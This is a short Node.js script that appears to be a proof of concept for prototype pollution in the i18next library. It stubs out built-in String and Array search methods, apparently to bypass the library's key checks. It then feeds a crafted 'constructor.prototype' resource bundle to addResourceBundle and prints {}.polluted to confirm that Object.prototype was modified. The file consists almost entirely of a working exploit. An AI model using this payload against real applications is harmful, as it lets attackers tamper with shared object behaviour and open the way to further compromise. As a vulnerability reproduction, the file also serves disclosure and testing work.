String.prototype.includes = () => false;
String.prototype.startsWith = () => false;
String.prototype.endsWith = () => false;
String.prototype.indexOf = () => -1;
String.prototype.lastIndexOf = () => false;
String.prototype.match = () => false;
String.prototype.search = () => false;
String.prototype.matchAll = () => false;
Array.prototype.includes = () => false;
Array.prototype.indexOf = () => -1;
const i18next = require('i18next');
const translations = '{"constructor.prototype": {"polluted":"yes"}}';
const existingData = {};
i18next.init({
    lng: 'en',
    resources: {}
});
console.log({}.polluted);
i18next.addResourceBundle('en', 'translation', JSON.parse(translations), true, true);
console.log({}.polluted);